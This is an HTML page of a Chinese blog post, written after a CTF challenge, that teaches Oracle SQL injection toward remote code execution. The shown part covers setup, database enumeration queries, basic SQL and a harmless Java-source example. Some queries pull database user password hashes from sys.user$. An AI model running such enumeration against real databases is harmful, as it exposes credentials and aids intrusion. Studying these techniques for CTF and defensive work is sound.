<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>Oracle 注入 RCE 由浅入深 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="Oracle 注入 RCE 由浅入深 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2024/02/29/Oracle%20%E6%B3%A8%E5%85%A5%20RCE%20%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2024-02-29T00:42:24.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>February</span>
            <span>29,</span>
            <span>2024</span>
        </div>
        

        <h2 class="title">Oracle 注入 RCE 由浅入深</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章在先知社区首发</p>
<p>京麒 CTF ez_oracle 中出现了oracle有关的rce注入。但是由于对oracle不熟悉导致没写出来，现在来学习一下oracle针对于rce的学习。</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>oracle提权是有版本限制的，因此也是比较好玩的- -，这里选用oracle 11g 112010<br><a target="_blank" rel="noopener" href="https://www.oracle.com/partners/campaign/112010-win64soft-094461.html">https://www.oracle.com/partners/campaign/112010-win64soft-094461.html</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702399613751-252578d7-fea3-46f6-8165-5b629ed6ed13.png#averageHue=%23f3f1ef&clientId=u318fcfe2-010e-4&from=paste&height=211&id=u6e5c063f&originHeight=211&originWidth=811&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28891&status=done&style=none&taskId=u9a8c301b-ee5f-4805-87ee-c5117a287fe&title=&width=811" alt="image.png"><br>注意这2个zip都需要下载，然后将他们解压到一个文件夹下，如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702402451441-c85050d1-0a0e-4d65-87cd-848e8a3f62a0.png#averageHue=%23fdfcfc&clientId=u318fcfe2-010e-4&from=paste&height=752&id=u1bee3def&originHeight=752&originWidth=1147&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56194&status=done&style=none&taskId=uf17f82ad-f700-4929-bc1d-b8591a2a205&title=&width=1147" alt="image.png"><br>最后只要一直往下点下一步就可以安装完毕了，安装完后会让你设置密码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702402472019-fab51494-3be7-4e32-9845-11a480d03ed0.png#averageHue=%23f2f3e0&clientId=u318fcfe2-010e-4&from=paste&height=378&id=u4a274337&originHeight=378&originWidth=583&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10196&status=done&style=none&taskId=u476888d0-a974-4968-bd60-d4727541bfe&title=&width=583" alt="image.png"><br>设置完后就算安装结束了，只不过我这边本地不能用navicat去连接数据库。不知道为什么。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702402493844-2bc0af05-4b37-4bbe-840d-1873436b6f4e.png#averageHue=%23fdfdfc&clientId=u318fcfe2-010e-4&from=paste&height=941&id=u06155d92&originHeight=941&originWidth=1435&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60402&status=done&style=none&taskId=u1197b1c2-f6df-412d-9ca4-ae375044643&title=&width=1435" alt="image.png"><br>安装完后会有一个product文件夹，我们随便进去一个，然后进入BIN文件夹，就会看见sqlplus.exe，我们用它连接数据库就好了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702402520445-cf623205-92c5-4d7c-86ad-0c8d48986a05.png#averageHue=%23494d57&clientId=u318fcfe2-010e-4&from=paste&height=598&id=u136bac2a&originHeight=598&originWidth=1235&originalType=binary&ratio=1&rotation=0&showTitle=false&size=914697&status=done&style=none&taskId=u8b9e4134-ae70-4165-a6a8-ac577531f52&title=&width=1235" alt="image.png"><br>（图示为简单的命令执行）</p>
<h1 id="Oracle-表结构-amp-amp-基础语法查询"><a href="#Oracle-表结构-amp-amp-基础语法查询" class="headerlink" title="Oracle 表结构&amp;&amp;基础语法查询"></a>Oracle 表结构&amp;&amp;基础语法查询</h1><h3 id="user-tables"><a href="#user-tables" class="headerlink" title="user_tables"></a>user_tables</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; desc user_tables;</span><br><span class="line"> Name                                      Null?    Type</span><br><span class="line"> ----------------------------------------- -------- ----------------------------</span><br><span class="line"> TABLE_NAME                                NOT NULL VARCHAR2(128)</span><br><span class="line"> TABLESPACE_NAME                                    VARCHAR2(30)</span><br><span class="line"> CLUSTER_NAME                                       VARCHAR2(128)</span><br><span class="line"> IOT_NAME                                           VARCHAR2(128)</span><br><span class="line"> STATUS                                             VARCHAR2(8)</span><br><span class="line"> PCT_FREE                                           NUMBER</span><br><span class="line"> PCT_USED                                           NUMBER</span><br><span class="line"> INI_TRANS                                          NUMBER</span><br><span class="line"> MAX_TRANS                                          NUMBER</span><br><span class="line"> INITIAL_EXTENT                                     NUMBER</span><br><span class="line"> NEXT_EXTENT                                        NUMBER</span><br><span class="line"> MIN_EXTENTS                                        NUMBER</span><br><span class="line"> MAX_EXTENTS                                        NUMBER</span><br><span class="line"> PCT_INCREASE                                       NUMBER</span><br><span class="line"> FREELISTS                                          NUMBER</span><br><span class="line"> FREELIST_GROUPS                                    NUMBER</span><br><span class="line"> LOGGING                                            VARCHAR2(3)</span><br><span class="line"> BACKED_UP                                          VARCHAR2(1)</span><br><span class="line"> NUM_ROWS                                           NUMBER</span><br><span class="line"> BLOCKS                                             NUMBER</span><br><span class="line"> EMPTY_BLOCKS                                       NUMBER</span><br><span class="line"> AVG_SPACE                                          NUMBER</span><br><span class="line"> CHAIN_CNT                                          NUMBER</span><br><span class="line"> AVG_ROW_LEN                                        NUMBER</span><br><span class="line"> AVG_SPACE_FREELIST_BLOCKS                          NUMBER</span><br><span class="line"> NUM_FREELIST_BLOCKS                                NUMBER</span><br><span class="line"> DEGREE                                             VARCHAR2(10)</span><br><span class="line"> INSTANCES                                          VARCHAR2(10)</span><br><span class="line"> CACHE                                              VARCHAR2(5)</span><br><span class="line"> TABLE_LOCK                                         VARCHAR2(8)</span><br><span class="line"> SAMPLE_SIZE                                        NUMBER</span><br><span class="line"> LAST_ANALYZED                                      DATE</span><br><span class="line"> PARTITIONED                                        VARCHAR2(3)</span><br><span class="line"> IOT_TYPE                                           VARCHAR2(12)</span><br><span class="line"> TEMPORARY                                          VARCHAR2(1)</span><br><span class="line"> SECONDARY                                          VARCHAR2(1)</span><br><span class="line"> NESTED                                             VARCHAR2(3)</span><br><span class="line"> BUFFER_POOL                                        VARCHAR2(7)</span><br><span class="line"> FLASH_CACHE                                        VARCHAR2(7)</span><br><span class="line"> CELL_FLASH_CACHE                                   VARCHAR2(7)</span><br><span class="line"> ROW_MOVEMENT                                       VARCHAR2(8)</span><br><span class="line"> GLOBAL_STATS                                       VARCHAR2(3)</span><br><span class="line"> USER_STATS                                         VARCHAR2(3)</span><br><span class="line"> DURATION                                           VARCHAR2(15)</span><br><span class="line"> SKIP_CORRUPT                                       VARCHAR2(8)</span><br><span class="line"> MONITORING                                         VARCHAR2(3)</span><br><span class="line"> CLUSTER_OWNER                                      VARCHAR2(128)</span><br><span class="line"> DEPENDENCIES                                       VARCHAR2(8)</span><br><span class="line"> COMPRESSION                                        VARCHAR2(8)</span><br><span class="line"> COMPRESS_FOR                                       VARCHAR2(30)</span><br><span class="line"> DROPPED                                            VARCHAR2(3)</span><br><span class="line"> READ_ONLY                                          VARCHAR2(3)</span><br><span class="line"> SEGMENT_CREATED                                    VARCHAR2(3)</span><br><span class="line"> RESULT_CACHE                                       VARCHAR2(7)</span><br><span class="line"> CLUSTERING                                         VARCHAR2(3)</span><br><span class="line"> ACTIVITY_TRACKING                                  VARCHAR2(23)</span><br><span class="line"> DML_TIMESTAMP                                      VARCHAR2(25)</span><br><span class="line"> HAS_IDENTITY                                       VARCHAR2(3)</span><br><span class="line"> CONTAINER_DATA                                     VARCHAR2(3)</span><br><span class="line"> INMEMORY                                           VARCHAR2(8)</span><br><span class="line"> INMEMORY_PRIORITY                                  VARCHAR2(8)</span><br><span class="line"> INMEMORY_DISTRIBUTE                                VARCHAR2(15)</span><br><span class="line"> INMEMORY_COMPRESSION                               VARCHAR2(17)</span><br><span class="line"> INMEMORY_DUPLICATE                                 VARCHAR2(13)</span><br><span class="line"> DEFAULT_COLLATION                                  VARCHAR2(100)</span><br><span class="line"> DUPLICATED                                         VARCHAR2(1)</span><br><span class="line"> SYNCHRONOUS_DUPLICATED                             VARCHAR2(1)</span><br><span class="line"> SHARDED                                            VARCHAR2(1)</span><br><span class="line"> EXTERNALLY_SHARDED                                 VARCHAR2(1)</span><br><span class="line"> EXTERNALLY_DUPLICATED                              VARCHAR2(1)</span><br><span class="line"> EXTERNAL                                           VARCHAR2(3)</span><br><span class="line"> HYBRID                                             VARCHAR2(3)</span><br><span class="line"> CELLMEMORY                                         VARCHAR2(24)</span><br><span class="line"> CONTAINERS_DEFAULT                                 VARCHAR2(3)</span><br><span class="line"> CONTAINER_MAP                                      VARCHAR2(3)</span><br><span class="line"> EXTENDED_DATA_LINK                                 VARCHAR2(3)</span><br><span class="line"> EXTENDED_DATA_LINK_MAP                             VARCHAR2(3)</span><br><span class="line"> INMEMORY_SERVICE                                   VARCHAR2(12)</span><br><span class="line"> INMEMORY_SERVICE_NAME                              VARCHAR2(1000)</span><br><span class="line"> CONTAINER_MAP_OBJECT                               VARCHAR2(3)</span><br><span class="line"> MEMOPTIMIZE_READ                                   VARCHAR2(8)</span><br><span class="line"> MEMOPTIMIZE_WRITE                                  VARCHAR2(8)</span><br><span class="line"> HAS_SENSITIVE_COLUMN                               VARCHAR2(3)</span><br><span class="line"> ADMIT_NULL                                         VARCHAR2(3)</span><br><span class="line"> DATA_LINK_DML_ENABLED                              VARCHAR2(3)</span><br><span class="line"> LOGICAL_REPLICATION                                VARCHAR2(8)</span><br><span class="line"> STAGING                                            VARCHAR2(3)</span><br><span class="line"> ROW_CHANGE_TRACKING                                VARCHAR2(3)</span><br><span class="line"> HAS_RESERVABLE_COLUMN                              VARCHAR2(3)</span><br></pre></td></tr></table></figure>
<p>该表比较重要，是当前用户表，里面储存着该用户的所有信息。</p>
<h3 id="dba-tables"><a href="#dba-tables" class="headerlink" title="dba_tables"></a>dba_tables</h3><p>dba权限用户才可以查看的表，里面有系统里所有信息。表的结构和上述的user_tables一致</p>
<h3 id="all-tables"><a href="#all-tables" class="headerlink" title="all_tables"></a>all_tables</h3><p>当前用户可以查看的所有表，表结构也一样</p>
<h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><ul>
<li>DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表</li>
<li>ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表</li>
<li>USER_ALL_TABLES：某一用户所拥有的对象和表</li>
</ul>
<p>表的结构都一样</p>
<h3 id="获取常见信息"><a href="#获取常见信息" class="headerlink" title="获取常见信息"></a>获取常见信息</h3><ul>
<li>版本 ：<code>SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%&#39;;</code>或者<code>SELECT version FROM v$instance;</code></li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460499639-44a01333-6931-4375-a70b-e7c5ef308af0.png#averageHue=%233f444d&clientId=u41a8b913-b9c9-4&from=paste&height=119&id=u62ac4232&originHeight=149&originWidth=687&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=148077&status=done&style=none&taskId=u818b3269-8c04-4a7b-8a91-3e5c3eabb72&title=&width=549.6" alt="image.png">、</p>
<ul>
<li>操作系统版本：<code>select banner from v$version where banner like &#39;TNS%&#39;</code></li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460547090-1a5cfb11-f313-4b62-a808-6d0841f5d77f.png#averageHue=%233a3f46&clientId=u41a8b913-b9c9-4&from=paste&height=109&id=u161df202&originHeight=136&originWidth=643&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=115572&status=done&style=none&taskId=ub1e99c7b-7186-4bfc-9c8c-3460c4d9f47&title=&width=514.4" alt="image.png"></p>
<ul>
<li>当前数据库：<code>select global_name from global_name;</code>，<code>select name from v$database;</code>,<code>select instance_name from v$instance</code>,<code>select sys.database_name from dual;</code></li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460627450-f94656c2-4628-43f7-ac04-be7f88f3b23c.png#averageHue=%23434752&clientId=u41a8b913-b9c9-4&from=paste&height=423&id=u5ccbcb86&originHeight=529&originWidth=918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=654147&status=done&style=none&taskId=ueaeb9c26-cffc-4df1-b8df-8741d217c82&title=&width=734.4" alt="image.png"></p>
<ul>
<li>获取当前用户权限的所有数据库：<code>select distinct owner,table_name from all_tables;</code></li>
<li>获取所有表名：<code>select table_name from all_tables;</code></li>
<li>获取所有字段名：<code>select column_name from all_tab_columns where table_name=&#39;xxx&#39;;</code></li>
<li>获取当前用户：<code>select user from dual;</code></li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460744112-3d5a73fe-5884-4897-ab8d-40484da2d12b.png#averageHue=%23393e49&clientId=u41a8b913-b9c9-4&from=paste&height=114&id=u94ba13ec&originHeight=143&originWidth=427&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=83992&status=done&style=none&taskId=ucb297b8c-f2b3-4b44-9062-a654d21405f&title=&width=341.6" alt="image.png"></p>
<ul>
<li>获取所有数据库用户：<code>select username from all_users order by username;</code>、<code>select name from sys.user$;</code></li>
<li>获取数据库用户的密码hash：<code>SELECT name, password, astatus FROM sys.user$;</code>、<code>SELECT name, spare4 FROM sys.user$;</code></li>
<li>当前用户的所有权限：<code>select * from session_privs;</code></li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460840234-64a0034e-88fa-432a-9c5d-59339bda3278.png#averageHue=%23464b54&clientId=u41a8b913-b9c9-4&from=paste&height=106&id=u07dcedb0&originHeight=133&originWidth=909&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=170870&status=done&style=none&taskId=u4a11a880-9957-411a-87e0-e6745c3605b&title=&width=727.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460853884-20710945-7c63-4426-a56f-0a6754db295d.png#averageHue=%23464a55&clientId=u41a8b913-b9c9-4&from=paste&height=362&id=uf401c9e5&originHeight=452&originWidth=456&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=306515&status=done&style=none&taskId=u6d3695ad-2fe6-4d6d-b5e1-8ab95e69e4d&title=&width=364.8" alt="image.png"></p>
<ul>
<li>获取用户角色(DBA OR DBO)：<code>select grantee,granted_role from dba_role_privs;</code>或者<code>select distinct grantee from dba_sys_privs;</code></li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460923698-b1253a91-56eb-4800-8364-7f167a6564e1.png#averageHue=%23494d57&clientId=u41a8b913-b9c9-4&from=paste&height=466&id=u4f85830b&originHeight=583&originWidth=1185&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=869177&status=done&style=none&taskId=ua1582b1d-416f-42de-8252-74d2846d6f8&title=&width=948" alt="image.png"></p>
<h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>在oracle中字符串的连接符用<code>||</code>，并且单引号和双引号表示的意思也不一样<br><code>&#39;xxx&#39;</code>表示的是xxx这个字符串，而<code>&quot;xxx&quot;</code>就等价于一个变量xxx，这是不同的点，需要注意，另外oracle需要严格的select from 语法，我们需要<code>select xxx from dual</code></p>
<h1 id="CURD"><a href="#CURD" class="headerlink" title="CURD"></a>CURD</h1><p>oracle的增删改查和mysql其实差不多。</p>
<h3 id="建表"><a href="#建表" class="headerlink" title="建表"></a>建表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE test1 (</span><br><span class="line">    tid NUMBER,</span><br><span class="line">    tname VARCHAR2 ( 20 )</span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line">-- 或直接copy别的表结构</span><br><span class="line"> </span><br><span class="line">CREATE TABLE emp20 AS SELECT</span><br><span class="line">*</span><br><span class="line">FROM</span><br><span class="line">    EMP</span><br><span class="line">WHERE</span><br><span class="line">    DEPTNO = 20;-- where条件有效，复制数据，无效，只复制表结构</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702459994674-238d2ab2-7429-4ed5-9d1f-ca2a2c057d7e.png#averageHue=%233c414b&clientId=u41a8b913-b9c9-4&from=paste&height=161&id=u510b12ed&originHeight=161&originWidth=457&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105340&status=done&style=none&taskId=u97f5ccd2-260b-4fe2-9cf1-f6a4a35b411&title=&width=457" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460001844-b4b07ea8-843e-4615-9a98-ad7ad3c10aa8.png#averageHue=%23444953&clientId=u41a8b913-b9c9-4&from=paste&height=162&id=ube3fa97d&originHeight=162&originWidth=828&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=197398&status=done&style=none&taskId=u0cd6d15a-f952-4ae5-b17e-74dd0401096&title=&width=828" alt="image.png"></p>
<h3 id="增加新列"><a href="#增加新列" class="headerlink" title="增加新列"></a>增加新列</h3><p><code>ALTER TABLE test1 ADD photo VARCHAR2(20); </code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460060315-d308b482-40cf-458c-8e6f-b769ddfa1647.png#averageHue=%23464b54&clientId=u41a8b913-b9c9-4&from=paste&height=195&id=u29a60d3c&originHeight=195&originWidth=870&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=247629&status=done&style=none&taskId=u581e22fe-775b-470f-913a-bd4940730b6&title=&width=870" alt="image.png"></p>
<h3 id="修改列"><a href="#修改列" class="headerlink" title="修改列"></a>修改列</h3><p>修改tname列的varchar长度为40<br><code>ALTER TABLE test1 MODIFY tname VARCHAR2 ( 40 );</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460104652-c2783912-e3d2-4e40-81a3-9f7fa955d0c4.png#averageHue=%23494e58&clientId=u41a8b913-b9c9-4&from=paste&height=250&id=u8f2425b3&originHeight=250&originWidth=941&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=337909&status=done&style=none&taskId=u963aa253-f23c-422f-881d-e6920c394a6&title=&width=941" alt="image.png"></p>
<h3 id="删除列"><a href="#删除列" class="headerlink" title="删除列"></a>删除列</h3><p><code>ALTER TABLE test1 DROP COLUMN photo2;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460125599-b5ee6c65-c071-491c-9b6f-882f93948705.png#averageHue=%23474b56&clientId=u41a8b913-b9c9-4&from=paste&height=454&id=u23a20272&originHeight=454&originWidth=921&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=594410&status=done&style=none&taskId=u7e2cac1e-6055-4211-b840-1519f2a013f&title=&width=921" alt="image.png"></p>
<h3 id="重命名某列"><a href="#重命名某列" class="headerlink" title="重命名某列"></a>重命名某列</h3><p><code>ALTER TABLE test1 RENAME COLUMN tname TO username;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460150404-34af94b0-b117-46db-8dff-316ae99a714f.png#averageHue=%23474c56&clientId=u41a8b913-b9c9-4&from=paste&height=245&id=u307f947e&originHeight=245&originWidth=790&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=287947&status=done&style=none&taskId=u32e52784-ee0a-4b01-a1d5-3d1bb718012&title=&width=790" alt="image.png"></p>
<h3 id="重命名表"><a href="#重命名表" class="headerlink" title="重命名表"></a>重命名表</h3><p><code>RENAME test1 TO test2;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460174448-d2e66cca-22a9-43f1-8514-8bc40b0d76c0.png#averageHue=%233e434d&clientId=u41a8b913-b9c9-4&from=paste&height=102&id=u1cc3dd84&originHeight=102&originWidth=552&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=83796&status=done&style=none&taskId=u28aa0c69-f452-482a-b1a8-8e615d78cf5&title=&width=552" alt="image.png"></p>
<h3 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h3><p><code>DROP TABLE testLearn;</code></p>
<h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><p><code>insert into test(tid,username,photo) values(100,&#39;test&#39;,&#39;test&#39;);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460301603-7366a7d2-6059-4c26-bfb5-337dea64214a.png#averageHue=%23484d57&clientId=u41a8b913-b9c9-4&from=paste&height=355&id=u1bbb318b&originHeight=355&originWidth=953&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=476105&status=done&style=none&taskId=u1d9760ee-9867-467c-929b-9dfc6744156&title=&width=953" alt="image.png"></p>
<h3 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h3><p><code>update test set username=&#39;admin&#39; where tid=100;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702460365799-2caf8835-0c59-42eb-94fb-83c903090d0b.png#averageHue=%23474b55&clientId=u41a8b913-b9c9-4&from=paste&height=215&id=u57e26dac&originHeight=215&originWidth=843&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=263606&status=done&style=none&taskId=u422367e6-5255-495f-b552-5d8ca5a8592&title=&width=843" alt="image.png"></p>
<h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><p><code>delete from xxx where xxx=xxx</code><br>其实增删改查操作和mysql数据库完全一致。没什么不一样的</p>
<h1 id="Java-Source"><a href="#Java-Source" class="headerlink" title="Java Source"></a>Java Source</h1><h3 id="创建Java-source"><a href="#创建Java-source" class="headerlink" title="创建Java source"></a>创建Java source</h3><p>oracle有一个特别的地方就是他可以创建java代码，并且编译运行，也就是说假如我们获取了一个oracle数据库的dba权限，那么我们就获取了任意Java代码执行的权限。这是比较危险的一个特性<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702478124796-17f181e3-b042-44b1-a9b2-736582354816.png#averageHue=%23faf9f8&clientId=u41a8b913-b9c9-4&from=paste&height=926&id=ua4fcbc61&originHeight=926&originWidth=2180&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=123529&status=done&style=none&taskId=u14770e74-7517-440d-81af-3e6e0dd5d07&title=&width=2180" alt="image.png"><br>官方是给了一个例子的，它使用的语法是<br><code>CREATE JAVA SOURCE NAMED &quot;xxxx&quot; AS &lt;Java Code&gt;</code><br>使用这一段语法可以创建一段java源码保存为oracle的一个对象，现在我使用如上语法创建一个输出hello world的函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE JAVA SOURCE NAMED &quot;Hello&quot; AS</span><br><span class="line">   public class Hello &#123;</span><br><span class="line">      public static String say() &#123;</span><br><span class="line">         return &quot;Welcome World&quot;;   &#125; &#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702478411561-fa447e11-ec83-49d6-946a-3ea8f4c1ec44.png#averageHue=%2340454f&clientId=u41a8b913-b9c9-4&from=paste&height=182&id=u8686f3f6&originHeight=182&originWidth=534&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=144042&status=done&style=none&taskId=ub61b61d7-5e38-4f90-9ce1-f8075c890de&title=&width=534" alt="image.png"></p>
